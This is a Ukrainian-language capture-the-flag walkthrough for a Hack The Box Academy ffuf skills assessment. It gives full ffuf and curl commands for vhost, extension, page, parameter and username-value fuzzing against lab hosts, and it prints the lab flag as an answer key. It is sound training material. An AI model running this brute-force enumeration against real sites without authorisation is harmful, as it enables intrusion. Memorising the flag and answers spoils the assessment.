# Skills Assessment — Web Fuzzing (FFUF)

## Модуль
[Attacking Web Applications with Ffuf — Skills Assessment](https://academy.hackthebox.com/app/module/54/section/511)

## Помилка яку варто запам'ятати

Extension fuzzing треба запускати на **кожному VHost окремо** після додавання
в `/etc/hosts`. Різні VHost-и можуть підтримувати різні розширення.
Завжди фаззити рекурсивно з усіма знайденими розширеннями: `.php`, `.phps`, `.php7`.

## Повний плейбук

### Q1 — VHost Fuzzing

```bash
# Визначити false positive size
curl -s http://TARGET:PORT/ -H "Host: randomxyz.academy.htb" | wc -c
# → 985 (дефолтна відповідь)

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://TARGET:PORT/ \
  -H "Host: FUZZ.academy.htb" \
  -fs 985
```

**Результат:** `archive, faculty, test`

```bash
# Додати в /etc/hosts — ОБОВ'ЯЗКОВО перед наступними кроками
echo "TARGET_IP  archive.academy.htb faculty.academy.htb test.academy.htb" \
  | sudo tee -a /etc/hosts
```

---

### Q2 — Extension Fuzzing (на кожному VHost)

```bash
# Запускати на кожному знайденому VHost
for vhost in archive faculty test; do
  echo "=== ${vhost}.academy.htb ==="
  ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
    -u http://${vhost}.academy.htb:PORT/indexFUZZ \
    -fs 0 -ic -s
done
```

**Результат:** `.php, .phps, .php7`

---

### Q3 — Page Fuzzing (рекурсивно з усіма розширеннями)

```bash
# Правильна команда — рекурсія + всі знайдені розширення
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://faculty.academy.htb:PORT/FUZZ \
  -recursion -recursion-depth 1 \
  -e .php,.phps,.php7 \
  -fs 0 -ic -v
```

**Результат:** `http://faculty.academy.htb:PORT/courses/linux-security.php7`

```bash
# Верифікація
curl -s http://faculty.academy.htb:PORT/courses/linux-security.php7
# → "You don't have access!"
```

---

### Q4 — Parameter Fuzzing (GET + POST)

```bash
# False positive size
curl -s http://faculty.academy.htb:PORT/courses/linux-security.php7 | wc -c
# → 774

# GET
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://faculty.academy.htb:PORT/courses/linux-security.php7?FUZZ=key" \
  -fs 774

# POST
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://faculty.academy.htb:PORT/courses/linux-security.php7" \
  -X POST -d "FUZZ=key" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs 774
```

**Результат:** `user, username`

---

### Q5 — Value Fuzzing → Flag

```bash
# username приймає імена людей — використати username wordlist
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
  -u "http://faculty.academy.htb:PORT/courses/linux-security.php7" \
  -X POST -d "username=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs 781 -ic -t 40

# Забрати флаг
curl -s -X POST "http://faculty.academy.htb:PORT/courses/linux-security.php7" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=harry"
```

**Flag:** `HTB{w3b_fuzz1n6_m4573r}`

---

## Зведена таблиця

| Q | Що шукали | Команда / метод | Результат |
|---|-----------|-----------------|-----------|
| 1 | VHost-и | VHost fuzzing `-H 'Host: FUZZ'` `-fs 985` | `archive, faculty, test` |
| 2 | Розширення | Extension fuzzing на кожному VHost `/indexFUZZ` | `.php, .phps, .php7` |
| 3 | Сторінка з "no access" | Recursive page fuzzing `-e .php,.phps,.php7` | `/courses/linux-security.php7` |
| 4 | Параметри | GET + POST parameter fuzzing | `user` (GET), `username` (POST) |
| 5 | Flag | Value fuzzing `xato-net-10-million-usernames.txt` | `HTB{w3b_fuzz1n6_m4573r}` |

## Ключові уроки

> 1. VHost-и одразу додавати в `/etc/hosts` — без цього extension/page fuzzing
>    через прямий IP дає некоректні результати.
> 2. Extension fuzzing запускати на **кожному VHost окремо** — розширення
>    можуть відрізнятись між хостами.
> 3. Page fuzzing — завжди з **усіма знайденими розширеннями** одночасно `-e .php,.phps,.php7`.
> 4. Для value fuzzing числовий `ids.txt` не завжди підходить — якщо параметр
>    називається `username`, використовувати `xato-net-10-million-usernames.txt`.
